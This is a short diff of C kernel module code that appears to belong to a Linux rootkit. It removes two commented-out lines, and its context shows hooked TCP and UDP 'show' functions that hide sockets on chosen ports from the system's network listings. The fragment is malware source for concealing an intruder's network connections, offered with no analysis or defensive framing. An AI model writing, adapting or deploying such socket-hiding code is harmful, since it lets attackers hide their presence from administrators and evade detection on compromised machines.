@@ -71,7 +71,6 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	port = ntohs(inet->inet_sport);
 
 	/* check protocol and port */
-	//if(port == port_number && strcmp(tlp_version, "tcp") == 0)
 	if(is_tcp_socket_hidden(port))
 	{
 		/* reduce our counter */
@@ -109,7 +108,6 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
 	port = ntohs(inet->inet_sport);
 
 	/* check protocol and port */
-	//if(port == port_number && strcmp(tlp_version, "udp") == 0)
 	if(is_udp_socket_hidden(port))
 	{
 		/* reduce our counter */
